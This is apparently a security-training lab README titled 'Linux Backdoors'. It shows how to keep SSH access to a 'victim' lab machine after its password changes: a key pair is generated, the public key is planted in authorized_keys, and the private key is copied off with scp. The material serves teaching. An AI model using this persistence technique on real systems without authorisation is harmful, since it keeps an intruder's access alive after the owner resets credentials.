# Linux Backdoors

This lab setup is meant to simulate a security professional setting up a backdoor in order to maintain access to the compromised system even after the user changed the passwrod.


## Prerequisites

To set up the lab first log in on the victim machine and execute the <code>setup.sh</code> script as sudo using the following command executee in the terminal
```sh
sudo ./setup.sh
```
The purpose of the script is to create a new user and set a default passwrod. To reset the lab and start again the <code>reset.sh</code> script can be used to remove the user, after which the <code>setup.sh</code> script can be executed again.

Victim IP: **192.168.212.151**
Host IP: **192.168.1.132**

<br/>

## Instructions

1.1 Create .SSH directory
```sh
# Create .SSH directory
mkdir .ssh

# Create the authorized keys file
touch .ssh/authorized_keys

# Ensure proper permissions
chmod 700 .ssh
chmod 600 .ssh/authorized_keys

# Generare ssh key pairs
ssh-keygen -b 4096 -t rsa

# Copy the public key in the authorized keys file
cat .ssh/id_rsa.pub >> .ssh/authorized_keys

# retrieve the private key from the server using SCP to the local folder
scp web@192.168.212.151:.ssh/id_rsa .

# attempt a connection with the following command
ssh -i id_rsa web@192.168.212.151

# change the password to: web123
passwd web

# check that you cannot log in
``` 

